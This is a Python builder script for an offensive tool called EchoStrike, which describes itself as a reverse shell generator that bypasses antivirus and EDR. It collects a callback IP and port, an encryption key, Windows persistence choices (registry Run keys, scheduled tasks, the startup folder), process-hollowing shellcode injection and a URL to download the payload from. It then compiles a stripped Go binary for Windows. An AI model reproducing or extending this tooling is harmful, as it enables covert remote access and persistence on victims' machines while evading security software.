import json
import os
import platform
import subprocess
import pyfiglet
from termcolor import colored
import signal
import sys
import re

# Constants for directory paths and config file
CONFIG_PATH = "../modules/config/settings.json"
SRC_DIR = "../src"

# Constants for persistence options and injection techniques
PERSISTENCE_OPTIONS = {
    "0": "No Persistence",
    "1": "Registry (CurrentUser Run)",
    "2": "Registry (Command Processor)",
    "3": "Task Scheduler (Admin Required)",
    "4": "Startup Folder",
}

TECHNIQUES = {
    "0": "No Shellcode Injection",
    "1": "Process Hollowing",
    "2": "More techniques coming soon...",
}

MIN_TARGET_SIZE_MB = 8


def create_banner():
    """Create and return an ASCII art banner for EchoStrike."""
    banner = pyfiglet.figlet_format("EchoStrike", font="slant")
    return banner


def add_border(text):
    """Add a consistent border around the banner text."""
    lines = text.splitlines()

    max_width = max(len(re.sub(r"\x1B\[[0-?]*[ -/]*[@-~]", "", line)) for line in lines)

    horizontal_border = "+" + "-" * (max_width + 2) + "+"

    bordered_lines = [f"| {line.ljust(max_width)} |" for line in lines]

    return (
        f"{horizontal_border}\n" + "\n".join(bordered_lines) + f"\n{horizontal_border}"
    )


def print_colored_banner():
    """Print the EchoStrike banner with color, but without affecting the borders."""
    banner = create_banner()

    bordered_banner = add_border(banner)

    bordered_lines = bordered_banner.splitlines()

    for line in bordered_lines:
        if "EchoStrike" in line:
            print(colored(line, "red", attrs=["bold"]))
        else:
            print(line)


def print_colored_details():
    """Print the additional details with colors outside the bordered area."""
    details = {
        "description": "Advanced Reverse Shell Generator - Bypassing AV/EDR",
        "author": "Author: Stiven Mayorga / aka. Stiven.Hacker",
        "version": "Version: 1.0.0",
    }

    print(colored(details["description"], "yellow", attrs=["bold"]))
    print(colored(details["author"], "blue", attrs=["bold"]))
    print(colored(details["version"], "red", attrs=["bold"]))


def print_intro():
    """Print the introductory banner with borders and colored text."""
    print_colored_banner()
    print_colored_details()


def validate_input(user_input, valid_options):
    """Validate user input against a set of valid options."""
    return user_input if user_input in valid_options else None


def update_config(
    address, port, encryption_key, persistence_option, target_size, method, url=None
):
    """Update the configuration file with the provided settings."""
    config = {
        "server_address": address,
        "server_port": port,
        "api_key": encryption_key,
        "persistence_option": persistence_option,
        "target_size": target_size,
        "method": method,  # Method is now stored as a number
        "url": url,  # URL can be None if no shellcode injection is selected
    }

    try:
        with open(CONFIG_PATH, "w") as config_file:
            json.dump(config, config_file, indent=4)
        print(
            colored(
                "\n[✓] Configuration updated successfully.", "green", attrs=["bold"]
            )
        )
    except Exception as e:
        print(
            colored(f"\n[✗] Failed to update configuration: {e}", "red", attrs=["bold"])
        )


def build_binary(output_name):
    """Build the Go binary based on the current OS, minimizing metadata."""
    try:
        if not os.path.isdir(SRC_DIR):
            raise FileNotFoundError(f"Source directory not found: {SRC_DIR}")

        os.chdir(SRC_DIR)

        # Detect the current operating system
        current_os = platform.system().lower()

        if current_os == "windows":
            # Command for compiling on Windows
            compile_command = ["go", "build", "-ldflags=-s -w -buildid=", "-trimpath", "-o", output_name]
        else:
            # Command for cross-compiling to Windows on Linux
            compile_command = ["env", "GOOS=windows", "GOARCH=amd64", "go", "build", "-ldflags=-s -w -buildid=", "-trimpath", "-o", output_name]

        # Run the appropriate build command
        subprocess.run(compile_command, check=True)

        print(
            colored(
                f"\n[✓] Binary generated successfully: {output_name}",
                "cyan",
                attrs=["bold"],
            )
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(colored(f"\n[✗] Error during compilation: {e}", "red", attrs=["bold"]))
    finally:
        # Ensure the script always returns to the initial directory
        os.chdir(os.path.dirname(os.path.abspath(__file__)))


def signal_handler(sig, frame):
    """Handle Ctrl + C (SIGINT) to exit gracefully."""
    print(
        colored("\n[!] Process interrupted. Exiting EchoStrike.", "red", attrs=["bold"])
    )
    sys.exit(0)


def main():
    # Register the signal handler for Ctrl + C
    signal.signal(signal.SIGINT, signal_handler)

    print_intro()

    try:
        # Gather user input
        address = input(
            colored("\n[>] Enter the new IP address: ", "blue", attrs=["bold"])
        )
        port = input(colored("\n[>] Enter the new port: ", "yellow", attrs=["bold"]))
        print(
            colored(
                "\n[!] If you're unsure how to generate a 128-bit AES key, you can use this tool: https://github.com/stivenhacker/AESCrafter",
                "red",
                attrs=["bold"],
            )
        )
        encryption_key = input(
            colored(
                "\n[>] Enter a 128-bit AES key (32 hexadecimal characters): ",
                "blue",
                attrs=["bold"],
            )
        )
        output_name = input(
            colored(
                "\n[>] Enter the name of the output binary (e.g., EchoStrike.exe): ",
                "red",
                attrs=["bold"],
            ),
        )

        # Ask the user for the persistence option
        print(colored("\n[•] Select Persistence Option", "green", attrs=["bold"]))
        for key, option in PERSISTENCE_OPTIONS.items():
            print(colored(f"[{key}] {option}", "cyan", attrs=["bold"]))

        persistence_option = validate_input(
            input(colored("\n[>] Enter your choice (0-4): ", "yellow", attrs=["bold"])),
            PERSISTENCE_OPTIONS,
        )

        if not persistence_option:
            print(
                colored(
                    "\n[!] Invalid choice, defaulting to '0: No Persistence'.",
                    "red",
                    attrs=["bold"],
                ),
            )
            persistence_option = "0"

        # Only ask for target size if persistence is not "No Persistence"
        target_size = None
        if persistence_option != "0":
            target_size = input(
                colored(
                    "\n[>] Enter the target size for the binary in MB (e.g., 7 for 7MB): ",
                    "blue",
                    attrs=["bold"],
                ),
            )
            print(
                colored(
                    "\n[ℹ] Note: This size adjustment applies only after the binary is copied to the persistence location.",
                    "yellow",
                    attrs=["bold"],
                ),
            )
            try:
                target_size = int(target_size)
                if target_size < MIN_TARGET_SIZE_MB:
                    print(
                        colored(
                            f"\n[!] Size too small, defaulting to {MIN_TARGET_SIZE_MB}MB.",
                            "yellow",
                            attrs=["bold"],
                        ),
                    )
                    target_size = MIN_TARGET_SIZE_MB
                target_size *= 1024 * 1024  # Convert to bytes
            except ValueError:
                print(
                    colored(
                        f"\n[!] Invalid size, defaulting to {MIN_TARGET_SIZE_MB}MB.",
                        "yellow",
                        attrs=["bold"],
                    ),
                )
                target_size = MIN_TARGET_SIZE_MB * 1024 * 1024  # Convert to bytes

        # Menu for selecting the process injection technique
        print(
            colored("\n[•] Select Process Injection Technique", "green", attrs=["bold"])
        )
        for key, technique in TECHNIQUES.items():
            print(colored(f"[{key}] {technique}", "cyan", attrs=["bold"]))

        technique_choice = validate_input(
            input(colored("\n[>] Enter your choice (0-2): ", "yellow", attrs=["bold"])),
            TECHNIQUES,
        )

        if not technique_choice:
            print(
                colored(
                    "\n[!] Invalid choice, defaulting to '0: No Shellcode Injection'.",
                    "red",
                    attrs=["bold"],
                ),
            )
            technique_choice = "0"

        selected_technique = technique_choice
        print(
            colored(
                f"\n[✓] You selected: {TECHNIQUES[selected_technique]}",
                "magenta",
                attrs=["bold"],
            ),
        )

        # Warning message for techniques not implemented
        if selected_technique != "1" and selected_technique != "0":
            print(
                colored(
                    f"\n[!] Warning: {TECHNIQUES[selected_technique]} is not yet implemented. Defaulting to 'Process Hollowing'.",
                    "yellow",
                    attrs=["bold"],
                ),
            )
            selected_technique = "1"

        # Check if the selected technique requires a URL for shellcode
        url = None
        if selected_technique != "0":
            url = input(
                colored(
                    "\n[>] Enter the URL for the payload to download: ",
                    "green",
                    attrs=["bold"],
                ),
            )

        # Update the config file
        update_config(
            address,
            port,
            encryption_key,
            persistence_option,
            target_size,
            selected_technique,  # Pass the technique as a number
            url,  # Pass the URL if a technique requiring it is selected
        )

        # Generate the binary with the specified name
        build_binary(output_name)

        print(
            colored(
                "\n[✓] Process completed. Thank you for using EchoStrike!",
                "magenta",
                attrs=["bold"],
            ),
        )
    except KeyboardInterrupt:
        signal_handler(None, None)


if __name__ == "__main__":
    main()